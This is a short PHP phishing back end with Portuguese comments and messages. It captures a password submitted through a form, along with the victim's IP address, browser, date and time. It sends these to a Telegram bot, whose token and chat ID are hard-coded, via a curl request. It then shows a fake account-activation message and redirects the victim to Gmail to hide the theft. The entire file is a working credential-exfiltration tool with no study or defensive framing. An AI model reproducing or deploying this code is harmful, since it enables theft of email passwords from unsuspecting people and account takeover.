<?php

/*Pegando os dados*/
$ip = $_SERVER['REMOTE_ADDR'];
$navegador =  $_SERVER['HTTP_USER_AGENT'];
$data = date('d/m/Y');
$horario = date('h:i:s');

/*Dados sobre o e-mail*/
$pass = $_POST['password'];

$vardokct = urlencode("IP:$ip\nNavegador:$navegador\nData:$data\nHorário:$horario\n------------------------\nSENHA:$pass");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot1828850191:AAG226rbc0OsMipPf7OCjPJqsBEgjQOb1u8/sendMessage?chat_id=1271321852&text=$vardokct");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$exec = curl_exec($ch);

echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');</script>";
header( "refresh:1;url=https://mail.google.com/mail/u/0/#inbox");

?>
